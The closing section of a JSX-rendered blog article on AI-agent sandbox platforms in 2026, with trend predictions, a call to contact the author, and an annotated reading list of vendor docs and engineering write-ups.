        <li>
          <strong>Snapshots become a primary primitive.</strong> Vercel,
          Cloudflare, and Modal all shipped or roadmapped snapshot-and-fork
          in 2026. The pattern - boot once, snapshot, fork on every run -
          is the most cost-effective shape for any high-volume sandbox
          fleet. The bottleneck shifts from compute to storage and pull
          bandwidth.
        </li>
        <li>
          <strong>Credential injection at egress becomes the default.</strong>{" "}
          Cloudflare shipped the cleanest version of this pattern at GA.
          Expect every serious platform to ship an egress-time auth layer
          in the next two quarters - the alternative (credentials in env,
          credentials in prompt) is no longer defensible.
        </li>
        <li>
          <strong>BYOC stops being a luxury.</strong> Healthcare, finance,
          and EU public sector are pushing enterprise procurement to
          require sandboxes that run inside the customer&rsquo;s VPC.
          Northflank is the most polished today; expect E2B and Modal to
          ship production-ready BYOC SKUs within the year.
        </li>
        <li>
          <strong>Sandbox + browser convergence.</strong> The line between
          &ldquo;code execution sandbox that can browse&rdquo; and
          &ldquo;browser sandbox that can execute code&rdquo; is
          dissolving. Cloudflare ships both as one runtime; Browserbase and
          E2B both offer the other primitive as a feature. Within a year
          the architectural choice will not be &ldquo;which sandbox&rdquo;
          but &ldquo;which integrated agent runtime&rdquo;.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Where to go from here
      </h2>
      <p className="mb-6 leading-relaxed">
        If your agent runs in production and does not yet run inside a
        sandbox, the highest-leverage engineering work available to you
        this quarter is moving it. The infrastructure is mature, the SDKs
        are clean, the cost models have collapsed onto active-CPU
        billing, and the threat model is no longer hypothetical. The
        platform you pick matters less than the discipline you bring to
        the four axes - isolation, cold start, session model, deployment
        surface - and the five production patterns above.
      </p>
      <p className="mb-6 leading-relaxed">
        If you want a second opinion on which sandbox platform fits your
        workload, or help wiring one into a LangGraph, CrewAI, or custom
        orchestration layer,{" "}
        <a
          href="/contact"
          className="font-semibold text-primaryColor hover:underline"
        >
          reach out
        </a>
        .
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Further reading
      </h2>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <a
            href="https://e2b.dev/docs"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            E2B documentation
          </a>
          {" "}&mdash; the canonical reference for the Firecracker-microVM
          SDK, Code Interpreter SDK, and self-hosting guides.
        </li>
        <li>
          <a
            href="https://modal.com/docs/guide/sandboxes"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Modal Sandboxes docs
          </a>
          {" "}&mdash; gVisor isolation, dynamic image definition, GPU
          passthrough, and the Memory Snapshots alpha for sub-second warm
          starts.
        </li>
        <li>
          <a
            href="https://vercel.com/blog/vercel-sandbox-is-now-generally-available"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Vercel Sandbox is now generally available
          </a>
          {" "}&mdash; the 30 January 2026 GA post, including the Roo Code
          and Blackbox AI case studies and the open-source SDK and CLI.
        </li>
        <li>
          <a
            href="https://blog.cloudflare.com/sandbox-ga/"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Cloudflare Sandboxes GA
          </a>
          {" "}&mdash; the 13 April 2026 launch post that defined
          persistent containers, PTY, code-interpreter contexts, secure
          credential injection, and the snapshot story.
        </li>
        <li>
          <a
            href="https://github.com/cloudflare/sandbox-sdk"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Cloudflare Sandbox SDK (GitHub)
          </a>
          {" "}&mdash; the TypeScript SDK that wraps Cloudflare Containers
          for AI agent use, with the <code>getSandbox</code> primitive and
          the <code>outboundByHost</code> credential-injection pattern.
        </li>
        <li>
          <a
            href="https://www.daytona.io/docs"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Daytona documentation
          </a>
          {" "}&mdash; the ~90ms cold-start sandbox platform with OCI/Docker
          compatibility, Kata Containers option, and Python and TypeScript
          SDKs.
        </li>
        <li>
          <a
            href="https://northflank.com/blog/best-code-execution-sandbox-for-ai-agents"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Northflank: the best code execution sandbox for AI agents in 2026
          </a>
          {" "}&mdash; the most up-to-date comparative table across
          isolation, cold start, session cap, BYOC, and pricing.
        </li>
        <li>
          <a
            href="https://www.firecrawl.dev/blog/ai-agent-sandbox"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Firecrawl: AI Agent Sandbox - how to safely run autonomous agents
            in 2026
          </a>
          {" "}&mdash; the canonical threat-model write-up: ZombAIs,
          indirect prompt injection, and the principle of least privilege as
          a sandbox architecture decision.
        </li>
        <li>
          <a
            href="https://builders.ramp.com/post/why-we-built-our-background-agent"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            Ramp: why we built our background agent
          </a>
          {" "}&mdash; the engineering write-up of &ldquo;Inspect&rdquo;,
          Ramp&rsquo;s Modal-backed background financial agent and one of
          the cleanest published examples of an ephemeral-sandbox-per-task
          architecture.
        </li>
        <li>
          <a
            href="https://www.insightpartners.com/ideas/e2b-raises-a-21m-series-a-to-offer-cloud-for-ai-agents-to-fortune-100/"
            className="font-semibold text-primaryColor hover:underline"
            target="_blank"
            rel="noopener noreferrer"
          >
            E2B raises a $21M Series A
          </a>
          {" "}&mdash; the July 2025 Insight Partners post with the customer
          list (Hugging Face, Perplexity, Groq, Manus) and the Fortune 100
          adoption number that the rest of the category quotes.
        </li>
        <li>
          <a
            href="/articles/browser-agents-production-2026"
            className="font-semibold text-primaryColor hover:underline"
          >
            Browser-using AI agents in 2026
          </a>
          {" "}&mdash; the companion piece on browser sandboxes (Browserbase,
          Steel, Hyperbrowser) for the workloads where the right primitive
          is a managed Chromium rather than an arbitrary microVM.
        </li>
        <li>
          <a
            href="/articles/langgraph-production-agents-2026"
            className="font-semibold text-primaryColor hover:underline"
          >
            LangGraph in 2026
          </a>
          {" "}&mdash; the orchestration layer we most commonly pair with a
          code-execution sandbox on multi-step agent workloads.
        </li>
        <li>
          <a
            href="/articles/mcp-production-ai-integrations-2026"
            className="font-semibold text-primaryColor hover:underline"
          >
            Model Context Protocol in 2026
          </a>
          {" "}&mdash; the protocol that increasingly wraps sandbox control
          as a callable MCP server in Claude Code, Cursor, and Windsurf.
        </li>
      </ul>
    </div>
  );
}
